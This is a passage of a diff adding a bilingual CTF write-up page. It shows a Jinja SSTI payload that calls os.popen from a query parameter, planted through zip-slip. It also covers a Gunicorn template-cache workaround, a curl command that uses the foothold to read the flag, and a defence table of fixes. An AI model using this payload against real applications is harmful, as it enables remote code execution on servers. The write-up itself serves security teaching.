+<span class="neutral">ZQ7X={{ 7*7 }}&lt;pre&gt;{{</span>
+<span class="danger">config.__class__.__init__.__globals__['os'].popen(request.args.get('c','id')).read()</span>
+<span class="neutral">}}&lt;/pre&gt;</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># SSTI payload in place of templates/login.html (and dashboard.html) via zip-slip</span>
+<span class="comment"># note: no &lt;id&gt; needed here: ../../ lands in the app base</span>
+<span class="neutral">ZQ7X={{ 7*7 }}&lt;pre&gt;{{</span>
+<span class="danger">config.__class__.__init__.__globals__['os'].popen(request.args.get('c','id')).read()</span>
+<span class="neutral">}}&lt;/pre&gt;</span></pre>
+</div></div>
+    <div class="callout-red">
+  <div class="callout-label" data-it="// l'ostacolo vero: la cache dei template" data-en="// the real obstacle: the template cache">// l'ostacolo vero: la cache dei template</div>
+  <p data-it="Sovrascrivere &lt;code&gt;login.html&lt;/code&gt; non basta. Gunicorn ha più worker e nessun auto-reload; Jinja mette in cache ogni template alla &lt;strong&gt;prima&lt;/strong&gt; render di quel worker. &lt;code&gt;login.html&lt;/code&gt; è già in cache ovunque, quindi il file avvelenato viene ignorato." data-en="Overwriting &lt;code&gt;login.html&lt;/code&gt; is not enough. Gunicorn has several workers and no auto-reload; Jinja caches each template on that worker's &lt;strong&gt;first&lt;/strong&gt; render. &lt;code&gt;login.html&lt;/code&gt; is already cached everywhere, so the poisoned file is ignored.">Sovrascrivere <code>login.html</code> non basta. Gunicorn ha più worker e nessun auto-reload; Jinja mette in cache ogni template alla <strong>prima</strong> render di quel worker. <code>login.html</code> è già in cache ovunque, quindi il file avvelenato viene ignorato.</p>
+</div>
+    <div class="callout-green">
+  <div class="callout-label" data-it="// la soluzione: il trucco fresh-worker" data-en="// the fix: the fresh-worker trick">// la soluzione: il trucco fresh-worker</div>
+  <p data-it="Basta avvelenare un template che &lt;strong&gt;quel&lt;/strong&gt; worker non ha ancora renderizzato. &lt;code&gt;dashboard.html&lt;/code&gt; è servito molto meno: martellando &lt;code&gt;/dashboard&lt;/code&gt; prima o poi rispondi da un worker che lo carica per la prima volta — avvelenato. SSTI attiva appena una richiesta cade su un worker che carica il template per la prima volta (di solito pochi colpi)." data-en="Just poison a template &lt;strong&gt;that&lt;/strong&gt; worker hasn't rendered yet. &lt;code&gt;dashboard.html&lt;/code&gt; is served far less: hammering &lt;code&gt;/dashboard&lt;/code&gt;, sooner or later a worker loads it for the first time — poisoned. SSTI fires as soon as a request lands on a worker that loads the template for the first time (usually a few hits).">Basta avvelenare un template che <strong>quel</strong> worker non ha ancora renderizzato. <code>dashboard.html</code> è servito molto meno: martellando <code>/dashboard</code> prima o poi rispondi da un worker che lo carica per la prima volta — avvelenato. SSTI attiva appena una richiesta cade su un worker che carica il template per la prima volta (di solito pochi colpi).</p>
+</div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># canale RCE stabile: ?c=&lt;comando&gt; sul worker avvelenato, ripeti finché vedi ZQ7X</span>
+<span class="neutral">curl -s "http://&lt;target&gt;:5000/dashboard?c=id" -b cookie.txt</span>
+<span class="ok">uid=996(roomservice) gid=996(roomservice)</span>
+<span class="neutral">?c=cat%20/home/roomservice/flag.txt</span>
+THM{<span class="redaction">████████████████████</span>}</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># stable RCE channel: ?c=&lt;command&gt; on the poisoned worker, repeat until you see ZQ7X</span>
+<span class="neutral">curl -s "http://&lt;target&gt;:5000/dashboard?c=id" -b cookie.txt</span>
+<span class="ok">uid=996(roomservice) gid=996(roomservice)</span>
+<span class="neutral">?c=cat%20/home/roomservice/flag.txt</span>
+THM{<span class="redaction">████████████████████</span>}</pre>
+</div></div>
+
+    <h2 data-it="[06] La flag — e il depistaggio degli hook" data-en="[06] The flag — and the hook red herring" id='flag'>[06] La flag — e il depistaggio degli hook</h2>
+    <p data-it="RCE come &lt;code&gt;roomservice&lt;/code&gt;, flag in &lt;code&gt;/home/roomservice/flag.txt&lt;/code&gt;. Da dire chiaro: gli «automation hook» promessi dalla room &lt;strong&gt;non esistono&lt;/strong&gt; nell'app in esecuzione. Ho testato ~900 nomi di chiave, cinque forme di manifest, file separati e callback di rete: nessun hook viene mai eseguito. È un depistaggio deliberato, e riconoscerlo è parte della sfida." data-en="RCE as &lt;code&gt;roomservice&lt;/code&gt;, flag in &lt;code&gt;/home/roomservice/flag.txt&lt;/code&gt;. To be clear: the &quot;automation hooks&quot; the room promises &lt;strong&gt;do not exist&lt;/strong&gt; in the running app. I tested ~900 key names, five manifest shapes, separate files and network callbacks: no hook ever runs. A deliberate red herring, and spotting it is part of the challenge.">RCE come <code>roomservice</code>, flag in <code>/home/roomservice/flag.txt</code>. Da dire chiaro: gli «automation hook» promessi dalla room <strong>non esistono</strong> nell'app in esecuzione. Ho testato ~900 nomi di chiave, cinque forme di manifest, file separati e callback di rete: nessun hook viene mai eseguito. È un depistaggio deliberato, e riconoscerlo è parte della sfida.</p>
+    <!-- policy: la flag è sempre oscurata, per scelta editoriale -->
+    <div class="callout">
+      <div class="callout-label" data-it="// flag — OSCURATA" data-en="// flag — REDACTED">// flag — OSCURATA</div>
+      <div class="code-block"><pre><span class="ok">THM{</span><span class="redaction" aria-label="flag oscurata">████████████████████</span><span class="ok">}</span></pre></div>
+      <p data-it="La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo &lt;code&gt;Enter&lt;/code&gt; lo batti tu." data-en="You won't find the flag here: the value itself teaches nothing, and half the fun is getting there. The methodology above is complete and reproducible — the last &lt;code&gt;Enter&lt;/code&gt; is yours to press.">La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo <code>Enter</code> lo batti tu.</p>
+    </div>
+
+    <h2 data-it="[07] Difesa — come si chiude ogni buco" data-en="[07] Defence — how each hole is closed" id='defence'>[07] Difesa — come si chiude ogni buco</h2>
+    <table>
+      <thead><tr><th data-it="Debolezza" data-en="Weakness">Debolezza</th><th data-it="Correzione" data-en="Fix">Correzione</th></tr></thead>
+      <tbody>
+        <tr><td data-it="Zip-slip nell'estrazione" data-en="Zip-slip on extraction">Zip-slip nell'estrazione</td><td class="ok" data-it="Normalizzare e verificare che il path risolto resti dentro la dest (os.path.realpath + controllo prefisso)" data-en="Normalise and verify the resolved path stays inside dest (os.path.realpath + prefix check)">Normalizzare e verificare che il path risolto resti dentro la dest (os.path.realpath + controllo prefisso)</td></tr>
+        <tr><td data-it="Allowlist sui file dichiarati" data-en="Allowlist over declared files">Allowlist sui file dichiarati</td><td class="ok" data-it="Validare i file realmente estratti, non il manifest; rifiutare l'intero archivio se contiene extra" data-en="Validate the actually-extracted files, not the manifest; reject the whole archive on extras">Validare i file realmente estratti, non il manifest; rifiutare l'intero archivio se contiene extra</td></tr>
+        <tr><td data-it="Template injection via scrittura arbitraria" data-en="Template injection via arbitrary write">Template injection via scrittura arbitraria</td><td class="ok" data-it="Directory template non scrivibile dal processo web (owner root, 0555); Jinja SandboxedEnvironment; deploy immutabile" data-en="Template dir not writable by the web process (owner root, 0555); Jinja SandboxedEnvironment; immutable deploy">Directory template non scrivibile dal processo web (owner root, 0555); Jinja SandboxedEnvironment; deploy immutabile</td></tr>
+      </tbody>
+    </table>
+    <div class="callout-green">
+  <div class="callout-label" data-it="// verdetto" data-en="// verdict">// verdetto</div>
+  <p data-it="La room impacchetta tre errori classici — fiducia nei nomi dei file di un archivio, validazione sul dato sbagliato, e un motore di template che valuta input — e ci avvolge un depistaggio narrativo. Il nome dice tutto: uno «slip» in uno zip che diventa una shell. La lezione in una frase: &lt;strong&gt;non fidarti mai di ciò che un archivio dichiara di essere, né di dove dice di volersi estrarre.&lt;/strong&gt;" data-en="The room packages three classic mistakes — trusting an archive's filenames, validating the wrong thing, and a template engine evaluating input — and wraps a narrative red herring around them. The name says it all: a &quot;slip&quot; in a zip that becomes a shell. The lesson in one line: &lt;strong&gt;never trust what an archive claims to be, nor where it says it wants to extract.&lt;/strong&gt;">La room impacchetta tre errori classici — fiducia nei nomi dei file di un archivio, validazione sul dato sbagliato, e un motore di template che valuta input — e ci avvolge un depistaggio narrativo. Il nome dice tutto: uno «slip» in uno zip che diventa una shell. La lezione in una frase: <strong>non fidarti mai di ciò che un archivio dichiara di essere, né di dove dice di volersi estrarre.</strong></p>
+</div>
+
+  </div><!-- /article-body -->
+  </article>
+  </main>
+
+  <div class="share-wrap">
+    <span class="share-lbl" data-it="// condividi" data-en="// share">// condividi</span>
+    <div class="share-btns">
+      <a class="share-btn" href="https://x.com/intent/tweet?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Fthe-hollow-shell%2F&via=PaoloCostanzoit" target="_blank" rel="noopener">X / Twitter</a>
+      <a class="share-btn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Fthe-hollow-shell%2F" target="_blank" rel="noopener">LinkedIn</a>
+      <button class="share-btn" onclick="copyLink(this)" data-it="copia link" data-en="copy link">copia link</button>
+    </div>
+  </div>
+
+  <aside class="author-box">
+    <span class="ab-label" data-it="// L'autore" data-en="// The author">// L'autore</span>
+    <div class="ab-name">Paolo Costanzo</div>
+    <div class="ab-role" data-it="Ricercatore indipendente di sicurezza · Co-Founder &amp;amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte" data-en="Independent Security Researcher · Co-Founder &amp;amp; CEO @ CoDe RTD · Professor of Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte">Ricercatore indipendente di sicurezza · Co-Founder &amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp; AWS @ ITS ICT Piemonte</div>
+    <p class="ab-bio" data-it="Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile." data-en="Independent research on cloud security, agentic AI systems, threat intelligence, networks and authorized offensive validation. Every report states its methodology, limitations and sources, and is reproducible where possible.">Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile.</p>
+    <div class="ab-links">
+      <a class="ab-cta" data-it="Scrivimi →" data-en="Get in touch →" href="mailto:me@paolocostanzo.com">Scrivimi →</a>
+      <a href="https://www.paolocostanzo.com" target="_blank" rel="noopener noreferrer">paolocostanzo.com</a>
+      <a href="https://www.linkedin.com/in/paolocostanzoit/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+      <a href="https://github.com/paolocostanzo" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </aside>
+  <div class="article-footer">
+    <a data-it="← tutti i writeup dell'evento" data-en="← all event writeups" href="/ctf/hacker-holidays-2026/">← tutti i writeup dell'evento</a>
+    <span class="footer-copy" data-it="© 2026 NonèCostanzo — lab autorizzato, per scopi educativi" data-en="© 2026 NonèCostanzo — authorised lab, for educational purposes">© 2026 NonèCostanzo — lab autorizzato, per scopi educativi</span>
+  </div>
+  <button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" data-it="↑ top" data-en="↑ top">↑ top</button>
+  <script>
+    function setLang(lang){
+      document.querySelectorAll('[data-'+lang+']').forEach(el=>{const val=el.getAttribute('data-'+lang);
+        if(el.tagName==='META'){el.setAttribute('content',val);}else if(el.tagName==='TITLE'){document.title=val;}else{el.innerHTML=val;}});
+      document.documentElement.lang=lang;
+      document.querySelectorAll('.lang-btn').forEach(b=>{const on=b.textContent.toLowerCase()===lang;b.classList.toggle('active',on);b.setAttribute('aria-pressed',on);});
+      document.querySelectorAll('.lang-it').forEach(el=>el.style.display=lang==='en'?'none':'');
+      document.querySelectorAll('.lang-en').forEach(el=>el.style.display=lang==='en'?'block':'none');
+      localStorage.setItem('lang',lang);
+    }
+    function copyLink(btn){const en=document.documentElement.lang==='en';
+      navigator.clipboard.writeText(window.location.href).then(()=>{btn.textContent=en?'copied ✓':'copiato ✓';btn.classList.add('ok');
+      setTimeout(()=>{btn.textContent=en?'copy link':'copia link';btn.classList.remove('ok');},2000);});}
+    const s=localStorage.getItem('lang'); if(s&&s!=='it')setLang(s);
+    const bar=document.getElementById('read-bar'),bt=document.getElementById('back-top');
+    window.addEventListener('scroll',()=>{const h=document.documentElement;bar.style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight))*100+'%';bt.classList.toggle('vis',h.scrollTop>400);},{passive:true});
+  </script>
+</body>
+</html>
